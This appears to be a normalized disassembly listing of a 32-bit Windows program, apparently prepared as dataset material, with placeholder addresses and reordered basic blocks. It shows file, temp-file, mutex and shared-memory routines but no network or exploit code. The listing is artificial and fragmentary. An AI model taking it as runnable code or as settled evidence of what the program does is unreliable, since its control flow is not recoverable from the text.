mov [ ecx + 0x1b84 ] eax
push 0x3d
push esi
lea eax [ ebp - 0x404 ]
push eax
push rw-data
mov [ ebp - 0x404 ] 0x0
call sub_402a88
pop ecx
push eax
push edi
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
lea eax [ ebp - 0x404 ]
push eax
call sub_40a0d0
pop ecx
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x1b88 ] eax
push 0x3d
push esi
lea eax [ ebp - 0x404 ]
push eax
push rw-data
mov [ ebp - 0x404 ] 0x0
call sub_402a88
pop ecx
push eax
push edi
call sub_40a1d9
add esp 0x14
test al al
pop edi
pop esi
je r-xdata
lea eax [ ebp - 0x404 ]
push eax
call sub_40a0d0
pop ecx
mov ecx [ ebp - 0x4 ]
shl eax 0xa
mov [ ecx + 0x1b7c ] eax
leave
retn 0x4
lea eax [ ebp - 0x404 ]
push eax
call sub_40a0d0
pop ecx
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x1b80 ] eax
sub_4093de
push ebp
mov ebp esp
sub esp 0x60
push esi
push edi
lea eax [ ebp - 0x8 ]
push eax
mov esi ecx
call [ GetSystemTimeAsFileTime@IAT ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
lea eax [ edi + 0x14 ]
push ecx
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_40918f
cmp eax [ esi + 0x1b8c ]
jbe r-xdata
mov ecx [ esi + 0x1b84 ]
push ebx
lea ebx [ edi + 0x20 ]
mov eax [ ebx ]
shl ecx 0xa
cmp eax ecx
ja r-xdata
xor eax eax
inc eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x1b88 ]
shl ecx 0xa
cmp eax ecx
jae r-xdata
pop edi
pop esi
leave
retn 0x4
pop ebx
lea eax [ ebp - 0x60 ]
push eax
call sub_404b23
pop ecx
add edi 0x2c
push edi
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0x60 ]
push edi
push eax
call sub_40522c
push 0x8
push [ ebp + 0x8 ]
lea eax [ ebp - 0x60 ]
push eax
call sub_40522c
push 0x4
lea eax [ ebp - 0x60 ]
push ebx
push eax
call sub_40522c
lea eax [ ebp - 0x60 ]
push eax
lea edi [ esi + 0x175c ]
push edi
call sub_405319
add esp 0x2c
push edi
mov ecx esi
call sub_409ba2
sub_409494
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
xor esi esi
push esi
mov eax 0x80
push eax
push 0x3
push esi
push 0x7
push eax
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor eax eax
inc eax
lea eax [ ebp - 0x8 ]
push eax
push esi
push esi
push edi
call [ GetFileTime@IAT ]
test eax eax
jne r-xdata
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
push edi
call [ CloseHandle@IAT ]
jmp r-xdata
push edi
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ esi ]
jne r-xdata
push edi
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
pop edi
pop esi
leave
retn 0x8
sub_40950c
push ebp
mov ebp esp
sub esp 0x2894
push ebx
push esi
push edi
xor ebx ebx
push ebx
push 0x80
push 0x3
push ebx
push 0x7
push 0x80000000
push [ ebp + 0x8 ]
mov esi ecx
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
mov [ ebp - 0x4 ] edi
jne r-xdata
push ebx
push edi
call [ GetFileSize@IAT ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x14 ]
push eax
push ebx
push ebx
push edi
call [ GetFileTime@IAT ]
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x54 ] bl
call sub_40a028
push [ ebp + 0x8 ]
lea eax [ ebp - 0x54 ]
push eax
push [ ebp - 0xc ]
lea eax [ ebp - 0x2894 ]
push rw-data
push eax
call sub_40a1c3
add esp 0x20
lea eax [ ebp - 0x494 ]
push eax
push 0x400
call [ GetTempPathA@IAT ]
lea eax [ ebp - 0x494 ]
push eax
push ebx
push ebx
push eax
call [ GetTempFileNameA@IAT ]
lea eax [ ebp - 0x494 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x2894 ]
push eax
lea eax [ ebp - 0x494 ]
lea edi [ esi + 0x418 ]
push eax
mov ecx edi
call sub_405db0
test al al
jne r-xdata
xor eax eax
push ebx
lea eax [ ebp - 0x8 ]
push eax
push 0x1000
lea eax [ ebp - 0x1894 ]
push eax
push [ ebp - 0x4 ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x494 ]
push eax
call [ DeleteFileA@IAT ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov ecx edi
call sub_405e85
mov eax [ esi + 0x41c ]
mov eax [ eax + 0x4 ]
lea ecx [ eax + esi + 0x41c ]
call sub_40589a
mov [ ebp + 0x8 ] eax
lea eax [ esi + 0x176c ]
push eax
mov ecx edi
call sub_405f11
mov ecx esi
call sub_409991
test eax eax
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1894 ]
push eax
mov ecx edi
call sub_405e54
push ebx
push 0xa
push 0x7530
call sub_4048de
add esp 0xc
push eax
call [ Sleep@IAT ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x494 ]
push eax
call [ DeleteFileA@IAT ]
jmp r-xdata
lea eax [ esi + 0x176c ]
push eax
mov ecx esi
call sub_409ba2
test eax eax
je r-xdata
mov ecx edi
call sub_405e85
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
mov ecx esi
call sub_409494
test eax eax
jne r-xdata
lea eax [ ebp - 0x94 ]
push eax
mov ecx edi
call sub_405ef0
push ebx
lea eax [ esi + 0x177c ]
push eax
lea eax [ ebp - 0x894 ]
push eax
call sub_409cdd
lea eax [ ebp - 0x94 ]
push eax
lea eax [ ebp - 0x894 ]
push eax
call sub_409cb9
lea eax [ ebp - 0x894 ]
push rw-data
push eax
call sub_409cb9
add esp 0x1c
push [ ebp + 0x8 ]
mov ecx esi
call sub_4091f8
test eax eax
jne r-xdata
xor ebx ebx
inc ebx
lea eax [ ebp - 0x494 ]
push eax
call [ DeleteFileA@IAT ]
xor ebx ebx
inc ebx
push ebx
lea eax [ ebp - 0x894 ]
push eax
lea eax [ ebp - 0x494 ]
push eax
call [ MoveFileExA@IAT ]
lea eax [ esi + 0x175c ]
push eax
mov ecx esi
call sub_409bee
lea eax [ esi + 0x176c ]
push eax
mov ecx esi
call sub_409bee
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov ecx esi
call sub_409978
mov eax ebx
jmp r-xdata
sub_409790
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
push esi
mov esi ecx
jne r-xdata
push [ ebp + 0xc ]
call sub_40902a
test eax eax
je r-xdata
lea eax [ esi + 0x177c ]
push eax
push [ ebp + 0x8 ]
call [ lstrcpyA@IAT ]
push rw-data
push [ ebp + 0x8 ]
call [ lstrcatA@IAT ]
mov ecx esi
call sub_40908b
jmp r-xdata
pop esi
pop ebp
retn 0x8
add esi 0x177c
push esi
push [ ebp + 0x8 ]
call [ lstrcpyA@IAT ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ lstrcatA@IAT ]
xor eax eax
inc eax
sub_4097f3
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je r-xdata
mov [ esi + 0x8 ] rw-data
mov [ esi + 0x10 ] rw-data
lea eax [ esi + 0x158 ]
mov [ eax ] rw-data
mov [ eax ] rw-data
mov [ esi ] rw-data
mov [ esi + 0x8 ] rw-data
mov [ esi + 0x10 ] rw-data
mov eax esi
pop esi
retn 0x4
lea ecx [ esi + 0x1304 ]
mov [ esi + 0x4 ] rw-data
mov [ esi + 0xc ] rw-data
call sub_405f50
sub_409899
push esi
push edi
mov esi ecx
call sub_409a8e
xor edi edi
inc edi
push edi
lea ecx [ esi + 0x418 ]
mov [ esi ] rw-data
call sub_4097f3
push rw-data
mov [ esi + 0x1b7c ] 0xc800
mov [ esi + 0x1b80 ] 0x1000
mov [ esi + 0x1b84 ] 0x2000
mov [ esi + 0x1b88 ] edi
mov [ esi + 0x1b8c ] 0xab18
call sub_402a88
pop ecx
push eax
xor edi edi
push edi
push 0x6
call [ OpenFileMappingA@IAT ]
push edi
push edi
push edi
push 0x6
push eax
mov [ esi + 0x1750 ] eax
call [ MapViewOfFile@IAT ]
mov ecx esi
mov [ esi + 0x1758 ] eax
mov [ esi + 0x1754 ] eax
call sub_40908b
pop edi
mov eax esi
pop esi
retn
sub_409926
push ecx
push esi
push edi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
mov esi ecx
push 0x80000000
lea eax [ esi + 0x18 ]
push eax
call [ CreateFileA@IAT ]
cmp [ esi + 0x8 ] 0xffffffff
mov edi eax
jne r-xdata
push 0x0
lea eax [ esp + 0xc ]
push eax
push 0x200020
push [ esi + 0x14 ]
push edi
call [ ReadFile@IAT ]
push edi
mov esi eax
call [ CloseHandle@IAT ]
mov eax esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ecx
retn
sub_409995
push ebp
mov ebp esp
sub esp 0x404
push ebx
push esi
lea eax [ ebp - 0x404 ]
push eax
push 0x400
mov esi ecx
call [ GetTempPathA@IAT ]
lea eax [ ebp - 0x404 ]
push eax
push 0x0
push rw-data
call sub_402a88
pop ecx
push eax
lea eax [ ebp - 0x404 ]
push eax
call [ GetTempFileNameA@IAT ]
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0xc0000000
lea eax [ ebp - 0x404 ]
push eax
call [ CreateFileA@IAT ]
cmp [ esi + 0x8 ] 0xffffffff
mov ebx eax
je r-xdata
pop esi
pop ebx
leave
retn
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x200020
push [ esi + 0x14 ]
push ebx
call [ WriteFile@IAT ]
push ebx
call [ CloseHandle@IAT ]
push 0x1
add esi 0x18
push esi
lea eax [ ebp - 0x404 ]
push eax
call [ MoveFileExA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x404 ]
push eax
call [ DeleteFileA@IAT ]
sub_409a5e
mov eax [ esp + 0x4 ]
mov edx [ eax ]
mov ecx [ esp + 0x8 ]
cmp edx [ ecx ]
jne r-xdata
xor eax eax
mov edx [ eax + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ eax + 0xc ]
cmp eax [ ecx + 0xc ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
retn 0x8
sub_409a8e
push ecx
push ebx
push ebp
push esi
push edi
mov esi ecx
xor edi edi
lea ebx [ esi + 0x18 ]
push ebx
push edi
push edi
push 0x1a
push edi
mov [ esi ] rw-data
mov [ esp + 0x24 ] edi
call [ SHGetFolderPathA@IAT ]
push rw-data
call sub_402a88
pop ecx
push eax
push ebx
call [ lstrcatA@IAT ]
mov ebx rw-data
push ebx
call sub_402a88
pop ecx
push eax
push edi
push 0x1f0001
call [ OpenMutexA@IAT ]
cmp eax edi
mov [ esi + 0x4 ] eax
jne r-xdata
mov ebx rw-data
push ebx
call sub_402a88
pop ecx
push eax
push edi
push 0x6
call [ OpenFileMappingA@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
mov ebp 0x200020
jne r-xdata
push ebx
call sub_402a88
pop ecx
push eax
push edi
push edi
call [ CreateMutexA@IAT ]
mov [ esi + 0x4 ] eax
push edi
push edi
push edi
push 0x6
push [ esi + 0xc ]
call [ MapViewOfFile@IAT ]
cmp [ esp + 0x10 ] edi
mov [ esi + 0x14 ] eax
mov [ esi + 0x10 ] eax
je r-xdata
push ebx
call sub_402a88
pop ecx
push eax
push ebp
push edi
push 0x4
push edi
push 0xffffffff
call [ CreateFileMappingA@IAT ]
mov [ esi + 0xc ] eax
mov [ esp + 0x10 ] 0x1
push [ esi + 0x4 ]
call [ ReleaseMutex@IAT ]
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov ecx esi
call sub_409926
test eax eax
jne r-xdata
push ebp
push [ esi + 0x14 ]
call sub_405388
pop ecx
pop ecx
push 0x10
push rw-data
call sub_402a88
pop ecx
push eax
push [ esi + 0x10 ]
call [ lstrcpynA@IAT ]
mov eax [ esi + 0x10 ]
mov [ eax + 0x10 ] edi
mov eax [ esi + 0x10 ]
mov [ eax + 0x14 ] edi
mov eax [ esi + 0x10 ]
mov [ eax + 0x18 ] edi
sub_409ba2
push edi
mov edi ecx
mov eax [ edi ]
call [ eax ]
test eax eax
jne r-xdata
push ebx
push esi
mov esi [ edi + 0x10 ]
xor ebx ebx
add esi 0x20
inc eax
xor esi esi
inc esi
inc ebx
add esi 0x10
cmp ebx 0x20000
jl r-xdata
pop edi
retn 0x4
push esi
push [ esp + 0x14 ]
mov ecx edi
call sub_409a5e
test eax eax
jne r-xdata
xor esi esi
jmp r-xdata
push [ edi + 0x4 ]
call [ ReleaseMutex@IAT ]
mov eax esi
pop esi
pop ebx
jmp r-xdata
sub_409bee
push ecx
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x10 ]
mov eax [ esi ]
call [ eax ]
test eax eax
jne r-xdata
and [ esp + 0x8 ] 0x0
push ebp
push edi
mov edi [ esi + 0x10 ]
lea ebp [ edi + 0x20 ]
pop esi
pop ebx
pop ecx
retn 0x4
xor edi edi
inc [ esp + 0x10 ]
add ebp 0x10
cmp [ esp + 0x10 ] 0x20000
jl r-xdata
push ebp
push [ esp + 0x1c ]
mov ecx esi
call sub_409a5e
test eax eax
jne r-xdata
push 0x10
push [ esp + 0x1c ]
lea eax [ ebx + 0x2 ]
shl eax 0x4
add eax edi
push eax
call sub_405366
mov eax [ esi + 0x10 ]
add esp 0xc
inc ebx
and ebx 0x1ffff
mov ecx esi
mov [ eax + 0x10 ] ebx
call sub_409995
xor edi edi
inc edi
jmp r-xdata
push [ esi + 0x4 ]
call [ ReleaseMutex@IAT ]
mov eax edi
pop edi
pop ebp
jmp r-xdata
sub_409c95
mov edx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov al 0x1
test al al
je r-xdata
cmp [ edx ] cl
je r-xdata
pop esi
retn
cmp cl [ edx ]
sete al
inc esi
inc edx
jmp r-xdata
mov cl [ esi ]
test cl cl
jne r-xdata
sub_409cb9
mov eax [ esp + 0x4 ]
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
inc eax
mov edx [ esp + 0x8 ]
test edx edx
je r-xdata
mov [ eax ] 0x0
retn
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
mov [ eax ] cl
inc eax
inc edx
sub_409cdd
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov bl [ ebp + 0x10 ]
test bl bl
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
mov [ esi ] 0x0
jne r-xdata
jle r-xdata
mov al [ edi ]
test al al
je r-xdata
jge r-xdata
jmp r-xdata
pop edi
mov [ esi ] 0x0
mov eax esi
pop esi
pop ebx
leave
retn
inc edi
mov [ esi ] al
mov al [ edi ]
inc esi
test al al
jne r-xdata
jmp r-xdata
mov al [ edi ]
test al al
jne r-xdata
test bl bl
cmp [ edi ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
jle r-xdata
inc edi
inc [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
movsx eax bl
sub esi eax
dec bl
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ esi ] 0x0
test bl bl
inc edi
mov [ esi ] al
inc esi
dec bl
movzx eax bl
push eax
push 0x20
push esi
mov [ ebp + 0x10 ] eax
call sub_404b0e
sub bl [ ebp + 0x10 ]
add esp 0xc
add esi [ ebp + 0x10 ]
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
neg bl
movzx eax bl
mov al [ edi ]
dec edi
mov [ esi ] al
dec esi
inc bl
dec [ ebp - 0x4 ]
jne r-xdata
inc esi
mov [ esi ] 0x20
dec esi
dec eax
jne r-xdata
jmp r-xdata
sub_409d93
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x10
push ebx
push esi
xor bl bl
test eax eax
push edi
jne r-xdata
xor edx edx
push 0xa
pop ecx
div ecx
movsx ecx bl
or dl 0x30
inc bl
test eax eax
mov [ ebp + ecx - 0x10 ] dl
jne r-xdata
mov [ ebp - 0x10 ] 0x30
inc bl
jmp r-xdata
mov al [ ebp + 0x10 ]
test al al
mov esi [ ebp + 0x8 ]
movsx ecx bl
lea ecx [ ebp + ecx - 0x10 ]
mov [ ecx ] 0x0
jne r-xdata
jle r-xdata
test bl bl
je r-xdata
jge r-xdata
jmp r-xdata
pop edi
mov [ esi ] 0x0
mov eax esi
pop esi
pop ebx
leave
retn
lea edi [ ecx - 0x1 ]
mov [ ebp + 0x13 ] 0x0
jmp r-xdata
test bl bl
jne r-xdata
mov cl [ edi ]
dec bl
dec edi
mov [ esi ] cl
inc esi
test bl bl
jne r-xdata
test al al
test bl bl
jne r-xdata
test al al
je r-xdata
test al al
je r-xdata
test al al
je r-xdata
test al al
je r-xdata
movsx ecx bl
mov cl [ ebp + ecx - 0x11 ]
dec bl
mov [ esi ] cl
inc esi
dec al
movzx edi al
push edi
push 0x20
push esi
call sub_404b0e
xor al al
add esp 0xc
add esi edi
test al al
mov cl [ ebp + 0x13 ]
test cl cl
je r-xdata
inc al
dec bl
inc [ ebp + 0x13 ]
neg al
movzx edi al
push edi
push 0x20
push esi
call sub_404b0e
add esp 0xc
add esi edi
movsx eax cl
lea eax [ ebp + eax - 0x11 ]
mov dl [ eax ]
dec cl
dec eax
mov [ esi ] dl
inc esi
test cl cl
jne r-xdata
sub_409e76
push ebp
lea ebp [ esp - 0x6c ]
sub esp 0x88
mov eax [ ebp + 0x78 ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push ebx
push esi
push edi
mov [ ebp + 0x64 ] ecx
mov [ ebp + 0x68 ] eax
xor bl bl
lea eax [ ebp + 0x64 ]
push 0xa
push eax
push eax
call sub_405f68
movsx ecx bl
or al 0x30
add esp 0xc
mov [ ebp + ecx - 0x1c ] al
inc bl
jmp r-xdata
cmp [ ebp + 0x68 ] 0x0
je r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
mov al [ ebp + 0x7c ]
test al al
mov esi [ ebp + 0x74 ]
movsx ecx bl
lea ecx [ ebp + ecx - 0x1c ]
mov [ ecx ] 0x0
jne r-xdata
jle r-xdata
test bl bl
je r-xdata
jge r-xdata
jmp r-xdata
pop edi
mov [ esi ] 0x0
mov eax esi
pop esi
pop ebx
add ebp 0x6c
leave
retn
lea edi [ ecx - 0x1 ]
mov [ ebp + 0x7f ] 0x0
jmp r-xdata
test bl bl
jne r-xdata
mov cl [ edi ]
dec bl
dec edi
mov [ esi ] cl
inc esi
test bl bl
jne r-xdata
test al al
test bl bl
jne r-xdata
test al al
je r-xdata
test al al
je r-xdata
test al al
je r-xdata
test al al
je r-xdata
movsx ecx bl
mov cl [ ebp + ecx - 0x1d ]
dec bl
mov [ esi ] cl
inc esi
dec al
movzx edi al
push edi
push 0x20
push esi
call sub_404b0e
xor al al
add esp 0xc
add esi edi
test al al
mov cl [ ebp + 0x7f ]
test cl cl
je r-xdata
inc al
dec bl
inc [ ebp + 0x7f ]
neg al
movzx edi al
push edi
push 0x20
push esi
call sub_404b0e
add esp 0xc
add esi edi
movsx eax cl
lea eax [ ebp + eax - 0x1d ]
mov dl [ eax ]
dec cl
dec eax
mov [ esi ] dl
inc esi
test cl cl
jne r-xdata
sub_409f71
mov dl [ esp + 0xc ]
mov eax [ esp + 0x4 ]
movsx ecx dl
add eax ecx
mov [ eax ] 0x0
jmp r-xdata
test dl dl
jne r-xdata
mov cl [ esp + 0x8 ]
dec eax
and cl 0xf
dec dl
cmp cl 0xa
jae r-xdata
jmp r-xdata
add cl 0x37
add cl 0x30
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
shr [ esp + 0x8 ] 0x4
mov [ eax ] cl
inc eax
retn
sub_409fae
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0x28
push ebx
push esi
push edi
push 0x9
pop ecx
mov esi rw-data
lea edi [ ebp - 0x28 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edi eax
xor bl bl
jmp r-xdata
cmp [ eax ] bl
jne r-xdata
inc eax
mov esi [ ebp + 0xc ]
movzx ecx [ esi + 0x6 ]
push 0xfffffffe
push ecx
push eax
call sub_409d93
add esp 0xc
cmp [ ebp + 0x10 ] bl
je r-xdata
movzx ecx [ esi + 0x2 ]
imul ecx ecx 0x3
lea ecx [ ebp + ecx - 0x2b ]
mov dl [ ecx ]
mov [ eax ] dl
mov dl [ ecx + 0x1 ]
mov cl [ ecx + 0x2 ]
mov [ eax + 0x1 ] dl
mov [ eax + 0x2 ] cl
add eax 0x3
mov [ eax ] bl
movzx ecx [ esi ]
push 0xfffffffc
push ecx
push eax
call sub_409d93
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
cmp [ edi ] 0x20
jne r-xdata
mov [ edi ] 0x30
sub_40a028
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
call [ FileTimeToSystemTime@IAT ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_409fae
mov eax [ ebp + 0x8 ]
add esp 0xc
leave
retn
sub_40a052
mov eax [ esp + 0x4 ]
xor dl dl
cmp [ eax ] dl
je r-xdata
retn
jmp r-xdata
lea ecx [ eax + 0x1 ]
cmp [ ecx ] dl
jne r-xdata
mov eax ecx
cmp [ eax ] 0x5c
je r-xdata
inc eax
mov [ eax ] 0x5c
mov [ eax + 0x1 ] dl
sub_40a074
movzx eax [ esp + 0x4 ]
mov cl al
sub cl 0x30
cmp cl 0x9
ja r-xdata
mov cl al
sub cl 0x61
cmp cl 0x5
ja r-xdata
and eax 0xf
retn
mov cl al
sub cl 0x41
cmp cl 0x5
ja r-xdata
sub eax 0x57
retn
or al 0xff
retn
sub eax 0x37
retn
sub_40a0a6
mov edx [ esp + 0x4 ]
movzx eax [ edx ]
push esi
xor esi esi
jmp r-xdata
test al al
jne r-xdata
push eax
call sub_40a074
test al al
pop ecx
jl r-xdata
mov eax esi
pop esi
retn
movsx eax al
shl esi 0x4
add esi eax
inc edx
mov al [ edx ]
sub_40a0d0
mov edx [ esp + 0x4 ]
movzx ecx [ edx ]
xor eax eax
jmp r-xdata
test cl cl
jne r-xdata
cmp cl 0x30
jl r-xdata
retn
cmp cl 0x39
jg r-xdata
imul eax eax 0xa
and ecx 0xf
add eax ecx
inc edx
mov cl [ edx ]
sub_40a0f5
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x4 ]
movsw [ edi ] [ esi ]
xor ebx ebx
cmp [ ecx ] bl
movsb [ edi ] [ esi ]
mov [ ebp - 0x8 ] ebx
mov esi ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edi [ ebp + 0x10 ]
add edi 0xfffffffc
inc esi
movzx ecx [ esi ]
cmp cl bl
je r-xdata
mov [ eax ] cl
inc eax
jmp r-xdata
cmp cl 0x30
jl r-xdata
inc esi
mov [ eax ] bl
cmp [ esi ] bl
jne r-xdata
mov dl [ esi ]
cmp dl bl
je r-xdata
cmp cl 0x39
jg r-xdata
mov cl [ esi ]
cmp cl 0x25
je r-xdata
add edi 0x4
cmp dl 0x64
mov ecx [ edi ]
je r-xdata
and ecx 0xf
mov [ ebp - 0x8 ] ecx
inc esi
movzx edx [ ebp - 0x8 ]
neg dl
push edx
push ecx
push eax
call sub_409d93
cmp dl 0x6c
je r-xdata
cmp ecx ebx
je r-xdata
cmp dl 0x73
je r-xdata
push ebx
movzx edx [ ebp - 0x8 ]
neg dl
push edx
push ecx
push eax
call sub_409e76
jmp r-xdata
cmp ecx ebx
push ebx
je r-xdata
cmp dl 0x78
jne r-xdata
push ecx
push eax
call sub_409cdd
jmp r-xdata
add esp 0xc
lea ecx [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x8 ]
push ecx
push eax
call sub_409f71
jmp r-xdata
sub_40a1d9
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
xor bl bl
cmp [ ecx ] bl
push esi
mov [ ebp - 0x1 ] 0x1
mov esi ecx
mov [ ebp - 0x4 ] bl
je r-xdata
mov al [ ebp - 0x4 ]
pop esi
pop ebx
leave
retn
mov edx [ ebp + 0x8 ]
push edi
mov edi [ ebp - 0x8 ]
mov edi [ ebp + 0xc ]
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x2 ] 0x1
mov [ ebp + 0xb ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x3 ] bl
jmp r-xdata
cmp [ ebp - 0x3 ] bl
je r-xdata
mov cl [ esi ]
cmp cl 0xa
je r-xdata
cmp [ ebp - 0x2 ] bl
je r-xdata
inc esi
cmp [ esi ] bl
jne r-xdata
mov cl [ esi ]
cmp cl 0xd
je r-xdata
mov [ ebp - 0x1 ] 0x1
cmp cl 0xd
jne r-xdata
cmp [ ebp - 0x1 ] bl
je r-xdata
pop edi
mov [ ebp - 0x1 ] 0x1
cmp cl 0xa
je r-xdata
cmp [ ebp + 0xb ] bl
je r-xdata
cmp [ edi ] bl
je r-xdata
cmp cl [ ebp + 0x18 ]
jne r-xdata
cmp [ ebp + 0xb ] bl
je r-xdata
cmp [ edi ] cl
je r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x3 ] 0x1
mov [ ebp - 0x2 ] bl
jmp r-xdata
mov [ ebp + 0xb ] bl
mov edi [ ebp + 0x14 ]
mov eax edx
sub eax [ ebp + 0x10 ]
dec edi
cmp eax edi
mov [ ebp - 0x4 ] 0x1
jge r-xdata
inc edi
mov [ ebp - 0x8 ] edi
mov [ ebp + 0xb ] bl
jmp r-xdata
mov [ edx ] cl
inc edx
mov [ edx ] bl
jmp r-xdata
sub_40a29a
mov al [ esp + 0x4 ]
mov cl al
sub cl 0x61
cmp cl 0x19
ja r-xdata
sub al 0x41
mov cl 0x19
cmp cl al
sbb al al
inc al
retn
mov al 0x1
retn
sub_40a2b6
push ebp
mov ebp esp
sub esp 0x1c
push esi
push edi
push 0x6
pop ecx
mov esi rw-data
lea edi [ ebp - 0x1c ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov dl [ ebp - 0x1c ]
pop edi
xor al al
lea ecx [ ebp - 0x1c ]
pop esi
jmp r-xdata
test dl dl
jne r-xdata
test al al
jne r-xdata
leave
retn
mov al 0x1
cmp dl [ ebp + 0x8 ]
jne r-xdata
inc ecx
mov dl [ ecx ]
sub_40a2ee
mov eax [ esp + 0x4 ]
mov cl [ eax ]
test cl cl
mov dl [ esp + 0x8 ]
push esi
push edi
je r-xdata
cmp [ eax ] dl
jne r-xdata
cmp cl dl
jne r-xdata
pop edi
pop esi
retn
inc eax
mov cl [ eax ]
test cl cl
je r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x14 ]
dec edi
test edi edi
je r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
mov [ esi ] cl
inc esi
dec edi
mov [ esi ] 0x0
cmp cl dl
je r-xdata
sub_40a336
mov cl [ esp + 0x4 ]
and cl 0xf
xor al al
cmp cl 0x9
ja r-xdata
mov dl cl
sub dl 0xa
cmp dl 0x5
ja r-xdata
mov al cl
add al 0x30
retn
add cl 0x37
mov al cl
sub_40a358
push ebx
mov ebx [ esp + 0xc ]
push esi
xor esi esi
cmp [ esp + 0x14 ] esi
jle r-xdata
mov [ ebx + esi * 2 ] 0x0
pop esi
mov eax ebx
pop ebx
retn
push edi
mov eax [ esp + 0x10 ]
lea edi [ esi + eax ]
movzx eax [ edi ]
shr al 0x4
push eax
call sub_40a336
mov [ ebx + esi * 2 ] al
movzx eax [ edi ]
push eax
call sub_40a336
mov [ ebx + esi * 2 + 0x1 ] al
inc esi
cmp esi [ esp + 0x20 ]
pop ecx
pop ecx
jl r-xdata
pop edi
sub_40a39d
push ebp
mov ebp esp
sub esp 0x44
push esi
push edi
push 0x10
pop ecx
mov esi rw-data
lea edi [ ebp - 0x44 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov cl [ esi ]
xor eax eax
xor al al
test eax eax
je r-xdata
inc eax
cmp eax 0x41
jb r-xdata
mov cl [ ebp + eax - 0x44 ]
test cl cl
je r-xdata
lea ecx [ ebp - 0x44 ]
dec ecx
cmp [ ebp + eax - 0x44 ] cl
je r-xdata
inc esi
mov al [ ebp + eax - 0x44 ]
